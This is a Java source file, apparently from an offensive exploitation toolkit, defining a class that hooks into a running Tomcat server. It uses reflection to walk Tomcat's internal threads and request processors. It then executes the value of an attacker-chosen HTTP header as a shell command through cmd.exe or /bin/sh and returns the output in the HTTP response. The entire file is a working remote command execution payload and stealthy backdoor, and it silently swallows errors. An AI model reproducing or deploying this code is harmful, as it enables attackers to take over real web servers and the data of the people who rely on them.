package com.ppp.middleware.rceecho;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.Middleware;

import java.io.InputStream;
import java.lang.reflect.Field;

/**
 * @author Whoopsunix
 */
@Middleware(Middleware.Tomcat)
@JavaClassModifiable(JavaClassModifiable.HEADER)
public class TomcatRceEcho {
    private static String HEADER;

    public TomcatRceEcho() {
        try {
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field field = threadGroup.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            Thread[] threads = (Thread[]) field.get(threadGroup);

            for (int i = 0; i < threads.length; i++) {
                // Thread 筛选
                Thread thread = threads[i];
                if (thread == null)
                    continue;
                String threadName = thread.getName();
                if (!(
                        ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))
                                || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))
                                || (threadName.contains("http-") && threadName.contains("Acceptor"))
                ))
                    continue;

                Object target = getFieldValue(thread, "target");
                Object this0 = getFieldValue(target, "this$0");
                Object handler = getFieldValue(this0, "handler");
                Object global = getFieldValue(handler, "global");
                java.util.List processors = (java.util.List) getFieldValue(global, "processors");

                for (int j = 0; j < processors.size(); j++) {
                    Object processor = processors.get(j);
                    Object req = getFieldValue(processor, "req");
                    Object response = req.getClass().getMethod("getResponse").invoke(req);
                    String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, HEADER);
                    if (header != null) {
                        String result = exec(header);
                        // doWrite
                        response.getClass().getMethod("setStatus", Integer.TYPE).invoke(response, 200);
                        try {
                            response.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(response, java.nio.ByteBuffer.wrap(result.getBytes()));
                        } catch (NoSuchMethodException e) {
                            Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                            Object byteChunk = clazz.newInstance();
                            clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);
                            response.getClass().getMethod("doWrite", clazz).invoke(response, new Object[]{byteChunk});
                        }
                        return;
                    }
                }

            }
        } catch (Exception e) {
        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
